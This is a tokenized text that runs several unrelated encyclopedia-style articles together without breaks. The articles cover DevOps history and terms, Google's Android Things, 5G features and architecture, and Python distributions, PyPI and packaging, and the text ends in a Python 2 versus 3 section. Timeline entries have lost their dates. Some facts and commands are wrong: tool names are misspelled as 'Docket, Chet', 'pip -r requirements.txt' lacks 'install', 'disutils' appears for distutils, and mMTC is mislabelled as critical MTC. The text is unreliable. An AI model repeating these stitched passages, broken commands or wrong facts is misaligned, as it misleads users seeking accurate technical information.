Practices such as Continuous Integration and Continuous Delivery are often followed .
Traditionally , products were monolithic in nature and release cycles were long .
While developers focused on creating working software , it was operations who ( manually ) ensured that it could run in a production environment .
Dev was all about adding new features .
Ops was about stability and availability .
Between these two were the testers .
DevOps brings these teams closer so that releases can happen as quickly as necessary .
DevOps has been described variously as a culture , a mindset , a framework and a movement .
How did DevOps come about ?
DevOps brings together Dev , Ops and QA .
Source : Baker , 2016 .
Until the early 2000s , software release cycles were typically long .
Even if developers could churn out features quickly , business folks would be wary of changes since software was considered brittle and deployments risky .
At the same time , user expectations and competition forced vendors to consider shorter release cycles .
Agile and lean methods were used to do this .
Even then , making frequent releases on a monolithic product was a challenge .
What really changed the scene was the arrival of cloud computing , SaaS and microservices .
Products were delivered as web services and later as a bunch of microservices .
This enabled vendors to make faster releases at the microservice level .
But deploying a networked service is the work of operations , who were mostly ignored by the Agile and Lean movements .
The result was that software that was ready would not go to customers until weeks or months later , waiting for operations to ensure it works properly in the production environment .
Also , operations now have to worry about security , virtual machines , containers , scaling , and more .
It was no longer plain system administration for operations .
DevOps has come to address these challenges .
Can you define DevOps ?
DevOps means many things at once .
Source : Baker , 2015 .
There 's no single definition of DevOps : DevOps is a cultural , professional movement focused on how we build and operate high - velocity organizations , born from the experiences of its practitioners .
DevOps is largely found in an organization ’s skillful collaboration and communication , and the culture that results .
DevOps is the practice of operations and development engineers participating together in the entire service lifecycle , from design through the development process to production support .
DevOps is ops who think like devs and devs who think like ops .
The point of dev - ops is that developers need to learn how to create high - quality , production - ready software , and they need to learn that agile techniques are actually powerful tools to enable effective , low - risk change management .
Ultimately , we ’re all trying to achieve the same thing – creating business value through software .
The Devops movement is characterized by people with a multidisciplinary skill set - people who are comfortable with infrastructure and configuration , but also happy to roll up their sleeves , write tests , debug , and ship features .
Could you dispel the common misconceptions or myths about DevOps ?
DevOps is not just about using tools or automating processes , although these are important .
DevOps is not just about people , culture or processes .
DevOps requires all of these to work together .
DevOps goes beyond just developers and operations .
It requires support and alignment from sales , marketing and even executives .
Having someone attend a DevOps conference or bringing a DevOps " expert " into your team does n't make a project " DevOps compliant " .
For that matter , DevOps is neither a standard nor a specification .
There 's no certification to recognize DevOps experts .
DevOps is really driven by practitioners and could be considered a knowledge - based movement .
It 's always evolving .
DevOps is not limited to using open source software .
It does not eliminate IT operations ( NoOps ) or replace Agile .
Continuous integration / delivery are not goals themselves .
They 're simply necessary steps in achieving DevOps goals .
Neither is there a goal to make multiple releases per day or week .
DevOps aims to release as often as necessary .
DevOps is not just for web companies delivering SaaS products or companies working at scale .
DevOps is for everyone .
Can you list some best practices for getting DevOps right ?
Although DevOps is not a set of practices , the following may help newbies get into the DevOps movement : DevOps is about People , Process and Tools , in that order .
Starting with tools would be the wrong way to do it .
John Willis gives us the CAMS formula : Culture , Automation , Measurement , Sharing .
Again , culture is critical to successful DevOps .
Everything needs to be automated and measured .
For measurements , establish KPIs .
Mean time to recovery is an example KPI .
Empathy is important to understand needs , break down silos and bring various teams together .
Start small on something strategic and then apply it on a large scale across the organization .
Invest in tools that give real - time visibility .
Tool integration is essential .
Multiple tools that do n't work well together will hamper collaboration .
Increase the speed of deployment .
To achieve this , invest in automation and practise agile techniques .
Participate in community events and online channels to share and learn .
Improve feedback at every step , whether it 's build , deploy , recovery or notifications .
Can you describe some common DevOps terms ?
Here are some terms often used in the DevOps world : Feature switch : Ability to turn on / off features at code level and thereby facilitate Continuous Delivery .
Trunk - based development : A version control practice in which all changes go into trunk rather than isolated branches .
Container : An isolated environment at OS level where microservices and applications can be deployed and executed more reliably .
Shift left : Automated testing is built into the software methodology from the outset .
The same can be done with deployment .
Orchestration : Method to manage and deploy applications and containers .
Staging : An environment that mimics the production environment so that updates can be tested before going into production .
Deployment pipeline : An automated pipeline to get software quickly from version control to users .
Serverless : An architecture in which resources are allocated on demand without explicit server management .
Microservices : Smaller manageable pieces of an application accessed via standard interfaces .
Immutable infrastructure : Infrastructure that ca n't be changed once initialized for better robustness and reliability .
Infrastructure - as - Code : Describes automated provisioning , configuring and monitoring of infrastructure .
What tools can facilitate DevOps implementation ?
DevOps tools by phases and categories .
Source : Bowman , 2017 .
There are dozens of tools out there to automate every aspect of DevOps .
These are commercial or open - source .
As of July 2017 , some tools were considered indispensable : Ansible , Docket , Chet , Puppet , JIRA , Jenkins , New Relic , Visual Studio , etc .
XebiaLabs curated a list of 100 + tools arranged as a " periodic table " .
They also published a list of open source tools .
Since tool integration requires effort , some vendors offer suites of integrated tools .
This can cause problems .
Errors in them will propagate through the entire lifecycle .
For example , throwing generic errors , tighly coupling pipeline stages to environments , showing ambiguous status or using terminology in the wrong sense can all be problems for a DevOps culture .
Instead , adopt single - purpose , focused tools that use an open standardized API .
How is DevOps related to Agile and Lean ?
Agile , Lean and DevOps .
Source : Marschall , 2012 .
It 's been said that to deliver quality products , we need all three : lean concepts , agile practices , and a DevOps mindset .
DevOps is an extension / adoption of Agile because what Agile does for development and testing , DevOps does for operations as well .
Agile is a powerful tool that operations can use .
Agile was about automating building , testing and delivery .
DevOps extends automation to deployment .
Lean focuses on end - to - end flow to address bottlenecks and wastages .
Lean is also about early product validation via customer feedback .
Agile , on the other hand , employs various techniques to build products faster .
DevOps uses Agile practices but also talks about how to integrate , test and deliver the product into the hands of users .
Just grafting operations to an existing Agile development process is not DevOps .
Having a DevOps team separate from the development team creates silos and this goes against the spirit of DevOps .
The Agile process has to be rethought to include operations from the outset .
Theresa Neate put it nicely , When you have a # DevOps team , you are not doing devops .
Are there any specializations in DevOps ?
DevSecOps attempts to bring security aspects into DevOps .
With the growing importance of data analytics , especially in real time , DataOps attempts to apply DevOps to analytics and enable better data - driven decisions .
While DevOps has been proven for individual applications , will it work for enterprises that use hundreds of diverse applications across private / public clouds and on - premises ?
This is being addressed by BizDevOps that 's more operations focused and has less tolerance for risk taking .
When it comes to collaboration , ChatOps is a model based on conversations to bring together tools , bots and people for transparent workflows .
NetOps tries to achieve agility in operations without sacrificing availability .
When IT operations are completely automated , though not eliminated , we have noops .
Cloud providers offering PaaS ease so much of day - to - day operations for their users that they tend to use the term NoOps to augment DevOps .
Even before the term DevOps was coined , some companies started practising it .
In an interview , Amazon 's Werner Vogels states that their developers also look after day - to - day operations , interfacing with customers and collecting direct feedback .
The goal is to improve the quality of service .
At the Agile Conference in Toronto , Andrew Shafer called for a session titled " Agile Infrastructure " .
Only one person , Patrick Debois , attends this .
He later meets Andrew and they together form the " Agile Systems Administration Group " .
Eric Ries refers to Steve Blank 's book titled " The Four Steps to Epiphany " .
The basic idea is to release a minimum set of features to the customer , get feedback , validate product - market fit and iterate quickly .
This was the start of the Lean movement and had an influence on DevOps .
A slide from the 2009 talk by Allspaw and Hammond : Elements of Tools and Culture for DevOps .
Source : Allspaw , 2009 .
At the O'Reilly Velocity conference , John Allspaw and Paul Hammond presented 10 + Deploys a Day : Dev and Ops Cooperation at Flickr .
Debois watches this from Belgium .
Inspired by this , Patrick Debois organizes DevOpsDays in Ghent , Belgium in October .
By the time the event ends , twitter hastag # DevOps become commonly used , giving the movement its current name .
DevOpsDays are organized in Sydney , California , Hamburg and Sao Paulo .
This is also the year when Jez Humble publishes his well - known book titled " Continuous Delivery " .
Enterprises have started adopting DevOps .
Android Things logo .
Source : Intel Software , 2018 .
Android Things is an operating system released by Google for IoT and embedded devices .
It 's based on Android , which in turn uses the Linux kernel .
It therefore has support for multitasking and virtual memory .
It 's meant to fit on devices with a limited memory footprint , although 512 MB is the minimum RAM requirement .
Android Things therefore targets a different IoT segment compared to microcontroller - based IoT devices .
For Android developers , building IoT apps will be easier via Android Things .
They can use familiar tools and interfaces : Android Studio , Android SDK , Google Play Services , Firebase and Google Cloud .
Android libraries including Kotlin and RxJava can be used .
In addition , Google certifies compatible System - on - Modules ( SoMs ) and provides the Board Support Package ( BSP ) .
Android Things Console will enable managed firmware and app updates to IoT devices .
Why should I use Android Things for my IoT device ?
Android Things architecture .
Source : Xinyu , 2017 , slide 7 .
If you 're an Android developer , it 's going to be easy to get into IoT app development with Android Things .
You can use familiar tools and interfaces , along with Firebase and Google Cloud Platform .
Google claims , if you can build an app , you can build a device . Android Things can run on both 32-bit and 64-bit platforms , on both ARM and x86-based processors .
Google certifies SoMs that work with Android Things and also provides the necessary BSPs .
The modular design of SoMs enables developers to use them on a development board while prototyping and reuse them on any custom carrier board designed for end products .
Development boards such as NXP iMX7D and Raspberry Pi 3 are available for fast prototyping .
The Android Things Console enables easy management of over - the - air ( OTA ) firmware updates in a secure manner without service interruption .
At a layer above the OS , Weave comes in to enable different devices to communicate using shared schemas .
Android Things comes with built - in Weave connectivity .
It 's to be noted that Weave can be used even without Android Things .
How is Android Things different from Android ?
Comparing the architectures of Android and Android Things .
Source : Mahmoudi , 2017 .
Android Things uses the same lower layers of the stack as Android .
For the application framework , while some APIs are not available in Android Things , the Things Support Library has been added .
This library provices low - level hardware access ( GPIO , PWM , I2C , SPI , UART , etc .
) , which is not possible with Android .
System apps and content providers typical on Android phones are not installed .
In general , APIs that are not available are those that require user input or authentication .
Displays are optional .
There 's no Play Store access for users to download and install apps .
As a developer , you will probably ship Android Things and your apps on your own custom hardware .
What 's part of the Things Support Library ?
There are three parts to this : Peripheral I / O API : Allows apps to access and control sensors and actuators using standard interfaces such as GPIO , PWM , I2C , SPI and UART .
User Driver API : Allows developers to extend framework services .
Apps can inject hardware events that other apps can use via Android APIs .
For example , a GPS module can update the framework of current location and other apps can use location manager APIs that are already part of Android .
Cloud IoT Core : Enables IoT data flow management within Google Cloud Platform .
How does Android Things compare against MCU - based IoT platforms ?
Android Things on a dual - core CPU with 512 MB RAM is not the right pick for just blinking LEDs or collecting and sending a few bytes of data .
It 's better suited for gateways and edge devices that require local processing .
Running Machine Learning inferences on the device is a possible use case .
This also means that Android Things is unsuitable for a range of processors from 8-bit MCUs to 32-bit ARM Cortex M - series cores .
Devices powered by Android Things will also consume much more power than MCUs , although they may be better at implementing security .
What are the hardware platforms that Android Things supports ?
As of May 2018 , the following are supported for production : NXP i .
MX8 M ( ARM Cortex A53 , 64-bit + QC7000Lite GPU ) Qualcomm SDA212 ( ARM Cortex A7 , 32-bit + QC Adreno 304 GPU ) Qualcomm SDA624 ( ARM Cortex A53 , 64-bit + QC Adreno 506 GPU ) MediaTek MT8516 ( ARM Cortex A35 , 64-bit ) Following are for prototyping and testing only : NXP i .
MX7D ( ARM Cortex A7 , 32-bit ) Raspberry Pi 3 Model B ( ARM Cortex A53 , 64-bit ) We can note that this covers both 32-bit and 64-bit processors .
While Intel Edison and Joule platforms support Android Things , the latter 's website no longer lists them .
NXP i .
The MX7D is an SoC , and it has an equivalent SoM and development board .
Both NXP and Intel SoMs include Wi - Fi and Bluetooth for connectivity .
Android Things also supports IEEE 802.15.4 for LoWPAN connectivity for which Nordic nRF52840 is a supported platform .
What tools and resources are available for working with Android Things ?
The following may be a starting point for developers : Android Studio command line ( CL ) tools : adb , apkanalyzer , dumpsys , logcat ... android - things - setup - utility : CL tool to flash images Android Things Console : manage images and push updates to devices pio : access Peripheral I / O via adb shell ( dev / debug ) lowpanctl : access LoWPAN via adb shell ( dev / debug ) Android Things native library : access Peripheral I / O natively in C / C++ when extra performance is needed Android Things main website and docs Code samples Peripheral Driver Library : open source driver code contributed by community that provide higher - level API on top of Peripheral I / O API Google 's IoT Developers Community on Google+ Hackster.io / google to get inspired by community projects When using Intel hardware , UPM and MRAA libraries can simplify peripheral I / O interfacing .
They offer an alternative to Google 's Things Support Library and Peripheral Driver Library .
Google made a first attempt at IoT by announcing Android@Home , which never took off , even as late as 2013 .
Google announced Brillo as the operating system for IoT devices .
Brillo is derived from Android and uses the latter 's lower layers : kernel and hardware abstraction layer .
It 's supposed that Brillo requires only 32 MB of RAM .
This was later claimed to be a ' rumour ' .
Google rebrands Brillo as Android Things .
Android Things was created based on developer feedback on Brillo .
Unlike Brillo , which was based on C++ , Android Things allows Android developers to code in Java and use familiar tools , interfaces and services they are already used to .
Developer Preview 6.1 has been released .
It 's based on Android 8.1 developer preview , can target apps using API level 27 and supports SDK 11.6 .
APIs are introduced for LoWPAN .
It 's clearly stated that this preview may have stability issues .
At CES 2018 in Las Vegas , some vendors showcased products that include Android Things .
In general , smart speakers integrate Android Things with Google Assistant while smart displays integrate Android Things with Google Cast .
Developer Preview 7 has been released with many new features on Android Things Console .
Android Things 1.0 has been released with long - term support for production devices .
This includes support for new SoMs , and configuration and control of Peripheral I / O via Android Things Console .
Google is refocusing on Android Things as a platform for OEM partners .
Over the last year , Google has already been working with vendors of smart speakers and smart displays , shipping Android Things with Google Assistant built - in .
Therefore , on the public developer platform , there wo n't be any further support for SoMs based on NXP , Qualcomm , and MediaTek hardware .
On the Android Things Console , projects based on NXP i .
The MX7D and Raspberry Pi 3B will be limited to 100 devices for non - commercial use .
From January 5th , Android Things Console does n't allow new projects based on NXP i .
MX7D and Raspberry Pi 3B. The Console can be used till January 5th , 2022 for existing projects .
After that date , all project data including build configurations and factory images will be deleted .
5 G promises 100x faster downloads .
Source : Shankland 2015 .
5 G is the next big evolution in cellular networks from its previous technologies of LTE , UMTS , and GSM .
5 G is simply named as 5 G , unlike 4 G aka LTE , or 2 G aka GSM .
5 G offers very high throughput with ultra - low latency and more connected devices .
With these new capabilities , 5 G can support diverse applications including AR / VR , IoT , autonomous driving , 4 K streaming , and more .
Millimeter Wave , Small Cells , Massive MIMO , Beamforming , and Full Duplex are the foundations of 5G. Major changes seen in 5 G architecture are with network elements , signal processing , interfaces between network elements , and protocol stack .
5 G also migrates from traditional telecom - style protocol interfaces to a Service - Based Architecture ( SBA ) that uses web services and APIs .
5 G was first standardized in 3GPP Release 15 specifications ( 2018 ) .
The first commercial 5 G networks were launched in April 2019 .
What are the key features or capabilities of 5 G ?
5 G performance compared to 4G. Source : Desjardins 2018 .
A comparison of 5 G with 4 G is insightful into what 5 G has to offer .
5 G improves on 4 G in terms of latency ( 1 ms vs 10 - 50 ms ) , throughput ( 20 vs 2 Gbps ) , spectral efficiency ( 100 vs 30 bps / Hz ) , density ( 1 M vs 100 K conns / km² ) , traffic capacity ( 1000 Mbps / m² vs 10 Mbps / m² ) , and network energy efficiency ( 15 % savings ) .
Another source lists 5 G capabilities as promising up to 10 Gbps in data rate ; 1 millisecond latency ; 1000x bandwidth per unit area ; 100x device density compared to 4 G ; 99.999 % availability ; 100 % coverage ; 90 % energy savings ; and up to 10-year battery life for low - power IoT devices .
How is 5 G technology able to promise 1000x data throughput ?
5 G techniques towards achieving 1000x data throughput .
Source : Björnson 2017 , 8:40 .
Capacity in cellular systems is the number of bits that can be carried per second per unit area within a given spectrum .
Its dimensions are bits / s / km² .
In general , capacity is composed of three parts : cell density , spectral efficiency and available spectrum .
5 G improves capacity by improving each of these parts .
Back in 2011 , Nokia proposed to achieve 1000x by improving each part by 10x .
In 2012 , SK Telecom proposed improvements on the order of 56x , 6x and 3x .
Cell density can be increased provided interference is managed .
Spectral efficiency can be improved by using an array of antennas so that all users in a cell can be sending / receiving at the same time using narrowly focused beams .
This is what Massive MIMO is all about .
Finally , more spectrum can be obtained if we go to millimeter waves , usually in the range of 30 - 300 GHz .
However , this requires new hardware and signal propagation is limited .
What are the main techniques that make 5 G possible ?
We note the following technical foundations of 5 G : Millimeter Wave : This refers to spectrum bands above 24 GHz .
The abundant spectrum available at these high frequencies is capable of delivering extreme data speeds and capacity that will reshape the mobile experience .
Massive MIMO : Uses large antenna arrays at base stations to simultaneously serve many autonomous terminals .
The rich and unique propagation signatures of the terminals are exploited with smart processing at the array .
Beamforming : Beamforming is a type of RF management in which an access point uses multiple antennas to send out the same signal .
It ensures an efficient data - delivery route to a user and reduces interference by other users .
Along with massive MIMO , beamforming improves spectrum efficiency and capacity .
Full Duplex : This allows us to transmit and receive on the same channel .
Benefits include more spectrum efficiency , symmetric fading characteristics , better filtering , novel relay solutions and enhanced interference coordination .
Small Cell : Small cells are low - power miniature base stations .
They operate on licensed or unlicensed spectrum , based on cellular technologies or Wi - Fi .
Small cells can help 5 G achieve 1000x throughput .
What are some use cases and applications of 5 G ?
three main 5 G application categories .
Source : Osseiran et al .
2020 , fig .
2 .
ITU has identified three main categories of 5 G applications based on performance attributes : Enhanced Mobile Broadband ( eMBB ) : Enables large volumes of data transfer and extreme data rates .
This applies to mobile phones , tablets and laptops .
Covers human - centric use cases .
Massive Machine Type Communications ( mMTC ) : also called Critical Machine Type Communications ( cMTC ) .
In the context of IoT and machine communications , this serves massive number of devices with low complexity and bandwidth that send small amounts of data .
Good coverage is important .
Serves low - cost battery - powered sensors , meters , actuators , trackers , and wearables .
Ultra - Reliable Low Latency Communications ( URLLC ) : Like mMTC , this is also machine - centric but with a focus on reliability and latency .
Applications include AR / VR , advanced wearables , autonomous vehicles , real - time industrial control , and more .
We can also visualize the above applications mapped to a 3D vector space defined in terms of throughput , delay and density .
For example , smart sensors would require high density , tolerable delay and only low throughput .
Interactive HD TV would require good throughput , delay and density .
Thus , there are many use cases that are a hybrid of the above categories .
Could you give an overview of the 5 G architecture ?
5 G architecture diagram .
Source : Devopedia 2018 .
The Next Generation Radio Access Network ( NG - RAN ) consists of gNB and ng - eNB .
gNB serves 5 G UE over 5 G New Radio ( NR ) , a new air interface developed for 5G. gNB connects to 5 G Core , though some can connect to 4 G EPC as well .
ng - eNB connects to 5 G Core but serves 5 G UE over 4 G radio .
5 G NR brings performance , flexibility , scalability and efficiency to spectrum usage .
Spectrum includes low - band ( 600 MHz ) , mid - band ( 3 - 5 GHz ) , and high - band ( 24 - 86 GHz ) regions .
5 G Core ( 5GC ) adopts a service - based architecture consisting of many interconnected Network Functions ( NFs ) .
Rather than using fixed network elements , all of these can be virtualized in the cloud .
Via Network Slicing , many virtual networks with different characteristics can reside on the same physical nodes .
Automation , programmability , flexibility and interoperability come from this architecture .
The 5GC control plane includes AMF ( Access and Mobility Management Function ) and SMF ( Session Management Function ) .
5 G user plane includes UPF ( User Plane Function ) .
5GC implements Control and User Plane Separation ( CUPS ) .
This enables it to centralize control plane functions while distributing user plane functions closer to users for better performance .
What are some common criticisms of 5 G ?
To obtain 1Gbps and 1ms performance , we need mmWave 5G. However , at this spectrum , the range is limited .
Users will get this performance in limited locations within urban areas .
Coverage will be spotty .
To counteract this , operators may need to install lots of small cells .
5 G rollout will come at a high cost , some of which may be passed on to subscribers .
New masts , antennas and smartphones will be needed .
Batteries may need to be recharged more often .
In rural areas , low - band 5 G can give better coverage than 4 G but ca n't offer peak 5 G performance .
With increased data rates and integration with IoT devices , 5 G poses a data security risk .
With many more connected devices , greater use of clouds and virtualization , the attack surface increases .
There have also been hoax theories concerning 5G. This has resulted in some groups distrusting 5 G and even damaging 5 G infrastructure .
In 2020 , 5 G was linked to the coronavirus pandemic .
The use of mmWave spectrum has been linked to cancer .
However , it 's known that only ionizing radiation at a much higher spectrum ( Gamma rays and X - rays ) is harmful .
Huawei introduces the concept of " Beyond LTE " .
Meanwhile , at the initiative of the EU project METIS , a few organizations across the world started discussions on what should follow 4G / LTE networks .
These discussions ( 2012 - 2014 ) lead to the first discussions within 3GPP in 2015 .
At 26GHz , Samsung demos a prototype system that achieves a 1Gbps data rate .
From 2013 - 2015 , many more demos will follow from Samsung , Ericsson , Nokia , Qualcomm , and others .
The intent is to prove the feasibility of technologies that could be used in 5 G , including the use of mmWave spectrum .
In August 2015 , the FCC promoted five blocks of mmWave spectrum .
3GPP begins the standardization of 5G. However , some requirements concerning Machine Type Communications ( MTC ) were already completed in earlier standardized features , namely LTE - M and NB - IoT. These were part of Release 13 ( 2016 ) and Release 14 ( 2017 ) .
3GPP approves the first specifications for 5 G , called " early drop " of Release 15 .
Specifically , it ratifies the Non - Standalone ( NSA ) 5 G New Radio ( NR ) specification .
This enables vendors to start implementing the first 5 G products .
NSA 5 G will allow operators to leverage existing 4 G infrastructure .
However , it ca n't support some use cases that require ultra - low latency and higher capacity .
Also part of Release 15 , and called " main drop " , 3GPP approves many specifications for 5 , G , including the Standalone ( SA ) option .
This allows operators without 4 G networks to offer 5 G service .
3GPP approves " late drop " of Release 15 .
This might aid in migrating from 4 G to 5 G , or NSA 5 G to SA 5G. However , some vendors and operators do n't see this as essential since Release 16 or 17 specifications could offer alternatives .
South Korean carriers SK Telecom and KT Corp become the first operators to launch the world 's first commercial 5 G service .
Within an hour later , Verizon launched its own 5 G service in the US in Chicago and Minneapolis .
Though trials and limited deployments for enterprises happened in 2018 , this is the first time 5 G commercial networks connect to 5 G smartphones .
5 G smartphones used in these deployments are the Samsung Galaxy S10 5 G and Motorola 's Moto Z3 with 5 G Mod .
Download speeds of 5 G networks in the US .
Source : Salter 2020 .
Tests by OpenSignal show Verizon delivering about 700Mbps download speeds in city downtown areas .
In low - band 5 G , AT&T and T - Mobile achieve speeds of about 60Mbps and 50Mbps respectively .
This is better than what 4 G can offer for rural areas .
In another study from February to April , OpenSignal finds 5 G giving better download speeds compared to 4G. This study included networks in the US , UK , South Korea and Australia .
This year sees some hoax theories to discredit 5G. 5 G is blamed for the coronavirus pandemic , either causing the pandemic , accelerating the spread of the virus or worsening the symptoms .
In another incident , the mass death of birds in the Netherlands was blamed on 5G. Subsequent reports show that this is fake news .
The birds died in another place and time due to other causes .
There are now more than 35 countries with 5 G service , with claims of faster rollout and adoption compared to 4G. Globally , there are now 114 commercial networks serving nearly 138 million 5 G subscribers .
By August , 190 commercial 5 G devices were available on the market .
In October , Apple announced iPhone 12 models with support for 5G. Additions and enhancements to 5 G in Release 16 .
Source : Qualcomm 2020b , slide 7 .
3GPP finalizes Release 16 specifications .
This adds support for unlicensed spectrum .
It improves latency , power consumption , positioning and cellular - to - vehicle connectivity .
Existing features enhanced by Release 16 include MIMO , beamforming , Dynamic Spectrum Sharing ( DSS ) , Dual Connectivity ( DC ) and Carrier Aggregation ( CA ) .
3GPP Release 17 specifications are expected to come out in 2022 .
It would impact all three case families : eMBB , URLLC and mMTC .
The focus will be on supporting growing traffic requirements , plus customizing NR for specific verticals such as automotive , logistics , public safety , media and manufacturing .
The Python Software Foundation does regular releases of Python , which we call the standard distribution .
This is a good starting point for beginners .
However , there are alternative distributions .
Developers may opt for these alternatives to suit their specific requirements or simplify the installation process .
Third - party packages are usually distributed via a central repository called the Python Package Index ( PyPI ) .
For developers who wish to release their software to the Python community , Python provides many tools to package their software in a standard way and release the same on PyPI .
As of February 2018 , PyPI has over 130,000 packages .
What 's the standard Python distribution and what does it include ?
The Python Software Foundation ( PSF ) releases the standard distribution of Python periodically at Python.org .
This includes Python 3.x and Python 2.x until the latter is retired .
Installables are available for Windows and Mac OS X. It 's also possible to install Python on Windows using a package manager such as Chocolatey .
For Linux / UNIX , source code is available , although most of them come pre - installed with Python that can also be updated by their respective package managers .
Python is also available for other OSs such as IBM i 7.1 + , iOS , VMS , HP - UX , and more ; but these lag behind the official release .
The standard implementation of Python is in C and is named CPython .
This includes implementation of the entire standard library .
Are there implementations of Python other than CPython ?
Yes .
The implementation refers to that of the interpreter itself that takes Python code and converts it into bytecode .
With CPython , the interpreter is written in C. This enables easy interfacing of C code with Python code .
Likewise , we have IronPython for .NET and Jython for JVM .
PyPy uses a JIT compiler for faster execution .
Stackless Python augments CPython to support microthreads .
MicroPython is a slim version of CPython that can run on microcontrollers .
These alternative implementations lag CPython releases .
For example , as of February 2018 , IronPython is not available for Python 3 and its Python 2 release has n't been updated since December 2016 .
Jython is available only for Python 2 .
PyPy is available for both 2 and 3 though lagging the latest version of CPython .
What are some alternatives to the standard Python distribution ?
What Python(x , y ) includes in its distribution .
Source : Davar 2015 .
There are a number of alternative Python distributions .
ActivePython is a commercial distribution that bundles many useful third - party packages along with the standard library .
There 's also a free Community Edition .
Anaconda and Enthought are two distributions customized for scientific computing and analysis .
While Anaconda is free , Enthought is commercial .
Intel offers an enhancement of Anaconda .
Python(x , y ) is based on Qt and Spyder .
This may be a good place to start for MATLAB / IDL / C / C++/Fortran programmers who wish to switch to Python .
Other alternatives include WinPython , Conceptive Python , PyIMSL , and more .
Stackless Python is limited by the heap and not the stack for recursion , and it consumes less memory .
The purpose of all of these distributions is to simplify the process of installation and package updates .
Commercial distributions also offer support such porting Python to an exotic platform or maintaining Python 2.x for legacy codebases .
What if you wish to use Python without bothering with any installation at all ?
PythonAnywhere allows you to code and execute on the cloud from a web browser .
It 's ideal for teachers and students .
What 's the purpose of PyPI ?
The PyPI logo .
Source : Pypi.org 2018 .
PyPI serves as a central repository for sharing third - party packages .
Developers can go to PyPI and search for packages that they might find useful in their applications .
If the source code is open ( on sites outside PyPI ) , they can also improve the package .
This is often a better approach than developing something from scratch .
Note two variants of PyPI : Production site : main download repository , powered by a codebase called Warehouse .
Test site : Site where developers can test their packaging before releasing it to the production site .
While it 's possible to download a package manually ( as source or binary ) , build and install the same , having packages on PyPI makes the process easier .
Packages are easier to find .
We can use a standard tool such as ` pip ` to manage packages and ` pip ` automatically knows where to look for packages .
As a Python user , how can I install a package ?
The tool pip can be used to install a package from PyPI .
It replaces an earlier tool named easy_install .
If pip itself is missing on your system , use system tools to install the same ; or download get-pip.py and execute ` python get-pip.py ` .
While pip is sufficient to install pre - built binaries , to build from source you will also need setuptools and wheel , which can be installed with the command ` pip install setuptools wheel ` .
If you 're working on multiple Python projects , each on a different version of Python , then it 's recommended to set up virtual environments and install required packages within each environment .
Run ` pip install virtualenv ` and then create / activate it using ` virtualenv myproj ; source myproj / bin / activate ` .
It 's common to list all project requirements in a file such as requirements.txt and then install all of them by running ` pip -r requirements.txt ` .
This file typically mentions each package name followed by a suitable version in a format specified in PEP 440 .
I do n't find pips suitable for my workflow .
What are my options ?
pyenv could be used to manage different environments .
Source : Google Cloud Platform 2017 .
An easier approach to using ` pip ` and ` virtualenv ` separately , or updating requirements.txt independently , is to use the package ` pipenv ` , which manages and tracks dependencies using ` Pipfile ` and ` Pipfile.lock ` files .
If you wish to create custom workflows , ` pip - tools ` are recommended .
Other alternatives include ` hatch ` and ` poetry ` .
What 's the definition of a package , packaging and distribution ?
A package is a bundle of one or more Python modules that can be shared , downloaded and installed .
A package is really nothing more than a folder that contains its module files ( and optionally sub - packages ) and a .
The process and tools used in making and uploading packages is called packaging .
The term distribution is usually reserved for a Python distribution and must not be confused for package distribution .
What are Eggs and Wheels ?
Both are built distribution formats for packages .
Wheels have replaced eggs as the preferred format .
The Installer pip supports only wheels while eggs can be installed with the older easy_install tool .
Wheels do n't include compiled Python files .
In a built distribution , files and metadata are included .
The files are simply moved to correct locations while installed .
There 's no separate building step before installation .
Python packaging specifies how to express dependencies and integration in the database of Python distributions .
Wheels implement these but not eggs .
Wheels have a richer naming convention .
Their binary format is standardized .
For these reasons , wheels are preferred .
There are three types of wheels : Universal Wheel : Project is pure Python and natively supports both Python 2 and 3 .
Pure Python Wheel : The Project is pure Python and does not necessarily support both Python 2 and 3 .
Platform Wheel : The Project contains compiled extensions .
Since pip will prefer a wheel over source distribution , avoid making universal wheels if your project contains extensions .
If you 're not providing the source and your project is not pure Python , then multiple wheels will need to be provided for every platform that you wish to support .
Can you guide me in packaging and distributing my own package ?
An example file structure of a project to be packaged .
Source : Feng 2017 .
The following are needed and can be installed using pip : setuptools : This extends the older distutils .
The project specification file is setup.py , which can further be controlled with setup.cfg .
wheel : This enables the creation of wheels .
twine : It 's possible to upload your package to PyPI by executing setup.py ( register and upload ) .
However , Twine is preferred .
This enables you to upload your package to PyPI securely .
Control of where to upload can be specified on file .pypirc in your home folder .
tox : This enables local installation and testing of your package in different environments .
Configuration is usually given in a file named tox.ini .
Similar testing can be done on the cloud using a service such as Travis CI .
The command ` python setup.py clean --all sdist bdist_wheel ` will perform the build : sdist for source distribution and bdist_wheel for creating wheels .
This will create two folders build/ and dist/. The former contains temporary files used during the building process .
The latter contains the final source archive ( * .tar.gz ) and/or binary wheels ( * .whl ) .
Python adds disutils to the standard library as a cross - platform build and distribution system .
A replacement for this called disutils2 was worked on during 2009 - 2012 , but this did n't make it into Python 3.3 .
PyPI goes online .
The package installer easy_install was released as part of setuptools .
The problem with easy_install is that it is n't easy to uninstall packages .
Comparing package installers pip and easy_install .
Source : Python Packaging 2018 .
Package installer pip has been released as an alternative to easy_installer .
This uses Wheel rather than Egg as the built distribution format .
It 's possible to use this to save package requirements to a file ( ` pip freeze > reqs.txt ` ) and recreate the same environment on another system ( ` pip install -r reqs.txt ` ) .
Wheel itself will be published later in 2012 - 13 .
The Python Packaging Authority ( PyPA ) was created .
Its job is to drive standardization , maintain tools and documentation related to Python packaging .
It recognizes that the Python packaging and distribution infrastructure needs improvements .
Anaconda 0.8.0 .
In February 2018 , Anaconda 5.1.0 was released .
WinPython v0.6 has been released .
In November 2017 , WinPython 3.6.3 was released .
Python 3.4 is released and it includes pip installer by default .
Kenneth Reitz releases version 11.10.1 of pipenv at PyPI .
Meanwhile , Warehouse replaces the legacy code to power PyPI .
This means that requests to ` pypi.python.org ` are redirected to ` pypi.org ` and they both share the same data store .
Python 3 was released to fix problems present in Python 2 .
The nature of these changes meant that Python 3 was incompatible with Python 2 .
It also meant that Python 3 did not carry forward the problems of Python 2 .
Some aspects of Python 3 have been backported to Python 2.6 and 2.7 to make the migration to Python 3 easier .
Python 2 was supposed to be retired in 2015 but slow adoption of Python 3 led to an extended deadline of 2020 .
Python 2.7 will receive updates until 2020 for security and bug fixes only .
As of February 2018 , it 's seen on Python 3 Readiness that 348 of 360 most downloaded packages from PyPI already support Python 3 .
It 's expected that if there should be a Python 4 , it will be compatible with Python 3 .
What were the main issues with Python 2 ?
A ` str ` object could represent either text or binary data .
This easily results in bugs because developers often do n't use the ` unicode ` type for text .
Python 3 solves this by making all ` str ` Unicode and having ` bytes ` type to handle binary data .
It 's explicit and unambiguous .
